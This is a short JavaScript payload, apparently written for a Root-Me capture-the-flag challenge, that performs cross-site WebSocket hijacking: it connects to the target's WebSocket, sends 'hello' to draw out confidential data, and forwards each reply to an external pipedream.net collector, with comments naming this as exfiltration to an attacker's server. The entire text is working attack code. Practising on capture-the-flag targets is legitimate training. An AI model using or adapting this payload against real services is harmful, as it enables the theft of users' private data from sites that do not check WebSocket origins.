websocket = new WebSocket('ws://ctf05.root-me.org/ws')
websocket.onopen = start
websocket.onmessage = handleReply
	
function start(event) {
	websocket.send("hello"); //Send the message to retreive confidential information
}
	
function handleReply(event) {
	 //Exfiltrate the confidential information to attackers server
	 fetch('https://eofk61vscx21f93.m.pipedream.net?'+event.data, {mode: 'no-cors'})
}
